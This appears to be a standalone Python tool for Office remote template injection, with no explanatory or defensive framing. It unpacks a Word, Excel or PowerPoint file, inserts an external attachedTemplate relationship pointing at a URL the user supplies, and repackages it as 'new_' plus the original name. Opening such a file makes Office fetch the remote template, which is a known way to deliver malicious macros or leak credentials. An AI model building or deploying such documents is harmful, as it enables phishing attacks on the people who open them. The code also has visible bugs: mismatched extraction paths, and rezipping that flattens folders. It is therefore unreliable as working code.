import zipfile
import sys
import os
import pathlib
import ntpath

setting_template = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"change_me_here\" TargetMode=\"External\"/></Relationships>"

if __name__ == '__main__':
    
    curpath = pathlib.Path(__file__).parent.absolute()
    if (len(sys.argv) != 3):
        print("Usage:")
        print("Argv[1]: Path to Document file (docx, xlsx, pptx, ...)")
        print("Argv[2]: URL to remote Template file")
        exit()
    if (os.path.isfile(sys.argv[1]) != True):
        print("Wrong path to Document file")
        exit()

    uncompress_path = os.path.join(curpath, "temp_data")
    print("Uncompressing... ", end='')
    try:
        with zipfile.ZipFile(sys.argv[1], 'r') as zip_ref:
            zip_ref.extractall("temp_data")
    except zipfile.BadZipFile:
        print("Please provide a Document!")
        exit()
    DocumentType = ""
    if (sys.argv[1].endswith(".docx")):
        DocumentType = "word"
    elif (sys.argv[1].endswith(".xlsx")):
        DocumentType = "xl"
    elif (sys.argv[1].endswith(".pptx")):
        DocumentType = "ppt"
    print("Done!")
    print("Document type: " + DocumentType)

    setting_xml_path = os.path.join(uncompress_path, DocumentType, "_rels", "settings.xml.rels")
    if (os.path.isfile(setting_xml_path)):
        print("This file already has settings.xml.rels files")
        #xml edit here
    else:
        setting_template = setting_template.replace("change_me_here", sys.argv[2])
        with open(setting_xml_path, 'w') as f:
            f.write(setting_template)
            f.close()
    #now recompress 
    file_name = ntpath.basename(sys.argv[1])
    file_name = "new_" + file_name
    with zipfile.ZipFile(file_name, 'w') as zipObj:
        for folderName, subfolders, filenames in os.walk(uncompress_path):
            for filename in filenames:
                #create complete filepath of file in directory
                filePath = os.path.join(folderName, filename)
                # Add file to zip
                zipObj.write(filePath, ntpath.basename(filePath))
        zipObj.close()

    
    